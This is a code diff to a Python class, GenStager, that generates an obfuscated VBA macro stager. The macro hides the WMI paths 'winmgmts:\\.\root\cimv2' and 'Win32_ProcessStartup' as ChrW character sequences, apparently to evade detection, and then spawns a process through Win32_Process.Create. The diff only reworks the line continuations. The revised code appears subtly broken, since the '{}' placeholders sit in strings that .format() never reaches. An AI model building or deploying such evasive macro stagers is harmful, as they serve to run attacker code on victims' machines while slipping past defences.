@@ -112,16 +112,16 @@ class GenStager:
 		# WMI Process instantiation stub
 		#macro += "\tSet {} = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")\n".format(varObjWMI)
 		# Somehow hidden like this:
-		macro += "\tSet {} = GetObject(ChrW(119) & ChrW(105) & ChrW(110) & ChrW(109) & ChrW(103) & ChrW(109) & ChrW(116) & ChrW(115) \
-						& ChrW(58) & ChrW(92) & ChrW(92) & ChrW(46) & ChrW(92) & ChrW(114) & ChrW(111) & ChrW(111) & ChrW(116) & ChrW(92) \
-						& ChrW(99) & ChrW(105) & ChrW(109) & ChrW(118) & ChrW(50))\n".format(varObjWMI)
+		macro += "\tSet {} = GetObject(ChrW(119) & ChrW(105) & ChrW(110) & ChrW(109) & ChrW(103) & ChrW(109) & ChrW(116) & ChrW(115) _\n"
+		macro += "\t\t& ChrW(58) & ChrW(92) & ChrW(92) & ChrW(46) & ChrW(92) & ChrW(114) & ChrW(111) & ChrW(111) & ChrW(116) & ChrW(92) _\n"
+		macro += "\t\t& ChrW(99) & ChrW(105) & ChrW(109) & ChrW(118) & ChrW(50))\n".format(varObjWMI)
 
 
 		#macro += "\tSet {} = {}.Get(\"Win32_ProcessStartup\")\n".format(varObjStartup, varObjWMI)
 		# Somehow hidden like this:
-		macro += "\tSet {} = {}.Get(ChrW(87) & ChrW(105) & ChrW(110) & ChrW(51) & ChrW(50) & ChrW(95) & ChrW(80) & ChrW(114) & ChrW(111) \
-								& ChrW(99) & ChrW(101) & ChrW(115) & ChrW(115) & ChrW(83) & ChrW(116) & ChrW(97) & ChrW(114) & ChrW(116) \
-								& ChrW(117) & ChrW(112))\n".format(varObjStartup, varObjWMI)
+		macro += "\tSet {} = {}.Get(ChrW(87) & ChrW(105) & ChrW(110) & ChrW(51) & ChrW(50) & ChrW(95) & ChrW(80) & ChrW(114) & ChrW(111) _\n"
+		macro += "\t\t& ChrW(99) & ChrW(101) & ChrW(115) & ChrW(115) & ChrW(83) & ChrW(116) & ChrW(97) & ChrW(114) & ChrW(116) _\n"
+		macro += "\t\t& ChrW(117) & ChrW(112))\n".format(varObjStartup, varObjWMI)
 		
 		
 		macro += "\tSet {} = {}.SpawnInstance_\n".format(varObjConfig, varObjStartup)
@@ -129,10 +129,10 @@ class GenStager:
 		
 		#macro += "\tSet {} = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2:Win32_Process\")\n".format(varObjProcess)
 		# Somehow hidden like this:
-		macro += "\tSet {} = GetObject(ChrW(119) & ChrW(105) & ChrW(110) & ChrW(109) & ChrW(103) & ChrW(109) & ChrW(116) & ChrW(115) \
-						& ChrW(58) & ChrW(92) & ChrW(92) & ChrW(46) & ChrW(92) & ChrW(114) & ChrW(111) & ChrW(111) & ChrW(116) & ChrW(92) \
-						& ChrW(99) & ChrW(105) & ChrW(109) & ChrW(118) & ChrW(50) & ChrW(58) & ChrW(87) & ChrW(105) & ChrW(110) & ChrW(51) \
-						& ChrW(50) & ChrW(95) & ChrW(80) & ChrW(114) & ChrW(111) & ChrW(99) & ChrW(101) & ChrW(115) & ChrW(115))\n".format(varObjProcess)
+		macro += "\tSet {} = GetObject(ChrW(119) & ChrW(105) & ChrW(110) & ChrW(109) & ChrW(103) & ChrW(109) & ChrW(116) & ChrW(115) _\n"
+		macro += "\t\t& ChrW(58) & ChrW(92) & ChrW(92) & ChrW(46) & ChrW(92) & ChrW(114) & ChrW(111) & ChrW(111) & ChrW(116) & ChrW(92) _\n"
+		macro += "\t\t& ChrW(99) & ChrW(105) & ChrW(109) & ChrW(118) & ChrW(50) & ChrW(58) & ChrW(87) & ChrW(105) & ChrW(110) & ChrW(51) _\n"
+		macro += "\t\t& ChrW(50) & ChrW(95) & ChrW(80) & ChrW(114) & ChrW(111) & ChrW(99) & ChrW(101) & ChrW(115) & ChrW(115))\n".format(varObjProcess)
 
 		macro += "\t{}.Create {}, Null, {}, intProcessID\n".format(varObjProcess, varStr, varObjConfig)
 		macro += "End Function\n"
